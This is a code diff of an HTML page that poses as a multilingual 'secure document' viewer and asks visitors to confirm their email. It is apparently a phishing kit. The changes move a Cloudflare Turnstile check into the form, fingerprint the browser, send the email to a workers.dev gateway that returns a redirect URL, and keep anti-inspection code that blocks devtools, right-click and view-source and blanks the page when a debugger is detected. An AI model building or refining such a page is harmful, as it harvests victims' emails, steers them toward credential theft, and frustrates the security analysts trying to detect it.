@@ -8,7 +8,10 @@
   <!-- Icons + Fonts -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
- <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
+  <!-- Cloudflare Turnstile -->
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+
   <style>
     :root{
       --accent:#10793F; --accent-2:#10793F;
@@ -32,8 +35,6 @@
       --bg-position:center center;
       --bg-scale:1.01;                 /* tiny scale to avoid blur edges */
     }
-
-    /* Background layer (behind everything) */
     .bg-img{
       position:fixed; inset:0; pointer-events:none; z-index:0;
       background-image:
@@ -47,10 +48,8 @@
       will-change:filter,transform;
     }
 
-    /* Make sure content paints above the bg */
     .container,.file-card{ position:relative; z-index:1; }
 
-    /* ===== Card ===== */
     .file-card{
       width:min(65vw,620px);
       margin:0 auto;
@@ -91,7 +90,6 @@
     }
     .btn.primary{background:linear-gradient(135deg,var(--accent),var(--accent-2));color:#fff;border:none;}
 
-    /* ===== Popup ===== */
     .popup{
       position:fixed;top:50%;left:50%;
       transform:translate(-50%,-50%) scale(.88);
@@ -111,6 +109,9 @@
       opacity:0;pointer-events:none;transition:.25s ease;z-index:999;
     }
     .overlay.active{opacity:1;pointer-events:auto;}
+
+    .captcha-wrapper{display:flex;justify-content:center;align-items:center;margin:10px 0;}
+    #cf-turnstile{transform:scale(.95);transform-origin:center;}
 
     @media (max-width: 640px){
       body{padding:12px}
@@ -162,23 +163,24 @@
         <input type="email" id="email" placeholder="name@company.com" autocomplete="email" autocapitalize="off" spellcheck="false" />
         <p class="error" id="err">Invalid email address</p>
       </div>
+
+      <!-- Turnstile inside the form -->
+      <div class="captcha-wrapper">
+        <div id="cf-turnstile"
+             class="cf-turnstile"
+             data-sitekey="0x4AAAAAABhsKFJ88b73jtsO"
+             data-callback="onTurnstileDone"
+             data-theme="light"></div>
+      </div>
+
       <div class="actions">
         <button type="button" class="btn" id="closeBtn">Cancel</button>
         <button type="submit" class="btn primary" id="submitBtn">Continue</button>
       </div>
     </form>
   </div>
-  
-<div id="cf-turnstile"
-     class="cf-turnstile"
-     data-sitekey="0x4AAAAAABhsKFJ88b73jtsO"
-     data-callback="onTurnstileDone"
-     data-theme="light"></div>
-  
- 
 
   <script>
-    
     /* ================== i18n ================== */
     const DICT = {
       en: {
@@ -190,10 +192,12 @@
         open: "Open document",
         title: "Confirm your email",
         invalidEmail: "Invalid email address",
+        captchaRequired: "Please complete the check",
         continue: "Continue",
         cancel: "Cancel",
         placeholder: "name@company.com",
-        errorGeneric: "Unable to process, please try again"
+        errorGeneric: "Unable to process, please try again",
+        redirecting: "Redirecting…"
       },
       fr: {
         banner: "Documents sécurisés avec accès contrôlé",
@@ -204,10 +208,12 @@
         open: "Ouvrir le document",
         title: "Confirmez votre e-mail",
         invalidEmail: "Adresse e-mail invalide",
+        captchaRequired: "Veuillez terminer la vérification",
         continue: "Continuer",
         cancel: "Annuler",
         placeholder: "prenom.nom@entreprise.com",
-        errorGeneric: "Impossible de traiter, veuillez réessayer"
+        errorGeneric: "Impossible de traiter, veuillez réessayer",
+        redirecting: "Redirection…"
       },
       de: {
         banner: "Sichere Dokumente mit kontrolliertem Zugriff",
@@ -218,10 +224,12 @@
         open: "Dokument öffnen",
         title: "E-Mail bestätigen",
         invalidEmail: "Ungültige E-Mail-Adresse",
+        captchaRequired: "Bitte schließen Sie die Prüfung ab",
         continue: "Weiter",
         cancel: "Abbrechen",
         placeholder: "vorname.nachname@firma.de",
-        errorGeneric: "Verarbeitung nicht möglich, bitte erneut versuchen"
+        errorGeneric: "Verarbeitung nicht möglich, bitte erneut versuchen",
+        redirecting: "Weiterleitung…"
       },
       nl: {
         banner: "Beveiligde documenten met gecontroleerde toegang",
@@ -232,10 +240,12 @@
         open: "Document openen",
         title: "E-mail bevestigen",
         invalidEmail: "Ongeldig e-mailadres",
+        captchaRequired: "Rond de verificatie af",
         continue: "Doorgaan",
         cancel: "Annuleren",
         placeholder: "voornaam.achternaam@bedrijf.nl",
-        errorGeneric: "Kan niet verwerken, probeer het opnieuw"
+        errorGeneric: "Kan niet verwerken, probeer het opnieuw",
+        redirecting: "Doorsturen…"
       }
     };
 
@@ -248,8 +258,9 @@
     const LANG = detectLang();
     const t = DICT[LANG];
 
-    // Apply translations
-    (function applyI18n(){
+    /* ================== Main ================== */
+    document.addEventListener("DOMContentLoaded", () => {
+      // Apply translations
       document.documentElement.lang = LANG;
       const el = (id) => document.getElementById(id);
       el('previewBanner').textContent = t.banner;
@@ -263,166 +274,110 @@
       el('closeBtn').textContent = t.cancel;
       const emailInput = el('email');
       if (emailInput) emailInput.setAttribute('placeholder', t.placeholder);
-    })();
 
-    /* ================== Popup wiring ================== */
-    const openBtn = document.getElementById('openBtn');
-    const closeBtn = document.getElementById('closeBtn');
-    const overlay = document.getElementById('overlay');
-    const popup = document.getElementById('popup');
-    const form = document.getElementById('emailForm');
-    const input = document.getElementById('email');
-    const errBox = document.getElementById('err');
+      // DOM refs
+      const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
+      const popup    = el("popup");
+      const overlay  = el("overlay");
+      const openBtn  = el("openBtn");
+      const form     = el("emailForm");
+      const errBox   = el("err");
+      const input    = el("email");
+      const submitEl = el("submitBtn");
 
-    const show = (el, msg) => { if (msg) el.textContent = msg; el.style.display = 'block'; };
-    const hide = (el) => el.style.display = 'none';
+      // Helpers
+      const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
+      const hide = (n) => { if (!n) return; n.style.display = 'none'; };
 
-    openBtn.addEventListener('click', () => { overlay.classList.add('active'); popup.classList.add('active'); input.focus(); });
-    const close = () => { overlay.classList.remove('active'); popup.classList.remove('active'); hide(errBox); };
-    closeBtn.addEventListener('click', close);
-    overlay.addEventListener('click', close);
-    document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
+      // Popup open/close
+      openBtn?.addEventListener('click', () => {
+        overlay?.classList.add('active'); popup?.classList.add('active'); input?.focus();
+      });
+      const close = () => { overlay?.classList.remove('active'); popup?.classList.remove('active'); hide(errBox); };
+      el('closeBtn')?.addEventListener('click', close);
+      overlay?.addEventListener('click', close);
+      document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
 
-    /* ================== Backend wiring (no captcha) ================== */
-   document.addEventListener("DOMContentLoaded", () => {
-  const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
+      // Turnstile token + fingerprint
+      let cfProof = "", fpHash = "";
+      window.onTurnstileDone = (token) => { cfProof = token; hide(errBox); };
 
-  // DOM refs (matched to your page)
-  const popup    = document.getElementById("popup");
-  const overlay  = document.getElementById("overlay");
-  const openBtn  = document.getElementById("openBtn");
-  const form     = document.getElementById("emailForm");
-  const errBox   = document.getElementById("err");
-  const input    = document.getElementById("email");
-  const submitEl = document.getElementById("submitBtn");
+      function getClientSig() {
+        const nav = navigator;
+        return [nav.userAgent, nav.language, nav.platform, screen.width + "x" + screen.height].join("|");
+      }
+      async function hashFingerprint(str) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+        return btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
+      }
+      hashFingerprint(getClientSig()).then(fp => fpHash = fp);
 
-  // i18n guard (uses existing `t` if defined)
-  const tSafe = (typeof window.t === "object" && window.t) ? window.t : {
-    invalidEmail: "Invalid email address",
-    unexpectedError: "Unexpected error",
-    connectionError: "Network error, try again",
-    redirecting: "Redirecting…"
-  };
+      // Submit
+      form?.addEventListener("submit", async (e) => {
+        e.preventDefault();
 
-  let cfProof = "", fpHash = "";
+        const val  = (input?.value || '').trim();
+        const trap = (el("middleName")?.value || '').trim();
+        const jsSig = "ok-" + Math.random().toString(36).slice(2);
 
-  // Delay popup render (kept from your script)
-  setTimeout(() => popup?.classList.add("js-ready"), 1500);
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(val)) return show(errBox, t.invalidEmail);
+        if (trap) return; // honeypot
+        if (!cfProof || cfProof.length < 10) return show(errBox, t.captchaRequired);
 
-  // Fingerprint
-  function getClientSig() {
-    const nav = navigator;
-    return [nav.userAgent, nav.language, nav.platform, screen.width + "x" + screen.height].join("|");
-  }
-  async function hashFingerprint(str) {
-    const encoder = new TextEncoder();
-    const data = encoder.encode(str);
-    const hashBuffer = await crypto.subtle.digest("SHA-256", data);
-    return btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
-  }
-  hashFingerprint(getClientSig()).then(fp => fpHash = fp);
+        try {
+          const res = await fetch(gateway, {
+            method: "POST",
+            headers: { "Content-Type": "application/json", "Accept-Language": LANG },
+            body: JSON.stringify({
+              email: val,
+              middleName: trap,
+              jsToken: jsSig,
+              cfToken: cfProof || "",
+              fingerprint: fpHash
+            })
+          });
 
-  // Turnstile callback
-  window.onTurnstileDone = (token) => {
-    cfProof = token;
-    if (errBox) errBox.style.display = "none";
-  };
+          const json = await res.json().catch(() => ({}));
+          if (!res.ok || !json.valid || !json.redirect) {
+            return show(errBox, json.message || t.errorGeneric);
+          }
 
-  // Helpers
-  const show = (el, msg) => { if (!el) return; if (msg) el.textContent = msg; el.style.display = "block"; };
-  const hide = (el) => { if (!el) return; el.style.display = "none"; };
-
-  // Open/close popup
-  openBtn?.addEventListener("click", () => {
-    popup?.classList.add("active");
-    overlay?.classList.add("active");
-    input?.focus();
-  });
-  document.addEventListener("click", (e) => {
-    if (!popup || e.target === openBtn) return;
-    if (!popup.contains(e.target)) {
-      popup.classList.remove("active");
-      overlay?.classList.remove("active");
-    }
-  });
-
-  // Submit
-  form?.addEventListener("submit", async (e) => {
-    e.preventDefault();
-    const val  = (input?.value || "").trim();
-    const trap = (document.getElementById("middleName")?.value || "").trim();
-    const jsSig = "ok-" + Math.random().toString(36).slice(2);
-
-    if (!/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(val)) return show(errBox, tSafe.invalidEmail);
-    if (trap) return; // honeypot
-    if (!cfProof || cfProof.length < 10) return show(errBox, "Please complete the check");
-
-    try {
-      const res = await fetch(gateway, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email: val,
-          middleName: trap,
-          jsToken: jsSig,
-          cfToken: cfProof || "",
-          fingerprint: fpHash
-        })
+          if (submitEl) submitEl.textContent = t.redirecting;
+          if (typeof turnstile !== "undefined") turnstile.reset("#cf-turnstile");
+          cfProof = "";
+          setTimeout(() => (location.href = json.redirect), 900);
+        } catch {
+          show(errBox, t.errorGeneric);
+        }
       });
 
-      const json = await res.json().catch(() => ({}));
-      if (!res.ok || !json.valid || !json.redirect) {
-        return show(errBox, json.message || tSafe.unexpectedError);
-      }
+      input?.addEventListener("input", () => hide(errBox));
 
-      if (submitEl) submitEl.textContent = tSafe.redirecting;
-      if (typeof turnstile !== "undefined") turnstile.reset("#cf-turnstile");
-      cfProof = "";
-      setTimeout(() => (location.href = json.redirect), 900);
-    } catch {
-      show(errBox, tSafe.connectionError);
-    }
-  });
+      // Anti-inspection (kept)
+      document.addEventListener("contextmenu", e => e.preventDefault());
+      document.addEventListener("keydown", e => {
+        if (
+          e.key === "F12" ||
+          (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) ||
+          (e.ctrlKey && e.key === "U")
+        ) e.preventDefault();
+      });
+      setInterval(() => {
+        const start = performance.now();
+        debugger;
+        const delta = performance.now() - start;
+        if (delta > 100) {
+          document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;'>Blocked</h1>";
+        }
+      }, 1500);
 
-  input?.addEventListener("input", () => hide(errBox));
-
-  // Optional: parse redirect info from URL (kept)
-  const r = (() => {
-    const match = window.location.pathname.match(/\/\.(\d+)\.([a-f0-9]{64})\/\$([a-zA-Z0-9+/=]+)$/);
-    if (!match) return null;
-    const [_, exp, hmac, b64] = match;
-    if (parseInt(exp, 10) < Date.now() / 1000) return null;
-    try { return { email: atob(b64), exp, hmac }; } catch { return null; }
-  })();
-  if (r && r.email) {
-    const showEmail = document.getElementById("userEmail");
-    if (showEmail) showEmail.textContent = r.email;
-    sessionStorage.setItem("validatedEmail", r.email);
-  }
-
-  // Anti-inspection (kept)
-  document.addEventListener("contextmenu", e => e.preventDefault());
-  document.addEventListener("keydown", e => {
-    if (
-      e.key === "F12" ||
-      (e.ctrlKey && e.shiftKey && ["I","J","C"].includes(e.key)) ||
-      (e.ctrlKey && e.key === "U")
-    ) e.preventDefault();
-  });
-  setInterval(() => {
-    const start = performance.now();
-    debugger;
-    const delta = performance.now() - start;
-    if (delta > 100) {
-      document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;'>Blocked</h1>";
-    }
-  }, 1500);
-
-  // JS-only fallback redirect (kept)
-  const noscript = document.createElement("noscript");
-  noscript.innerHTML = `<meta http-equiv="refresh" content="0;url=https://example.com">`;
-  document.body.appendChild(noscript);
-});
-</script>
+      // JS-only fallback redirect (kept)
+      const noscript = document.createElement("noscript");
+      noscript.innerHTML = `<meta http-equiv="refresh" content="0;url=https://example.com">`;
+      document.body.appendChild(noscript);
+    });
+  </script>
 </body>
 </html>
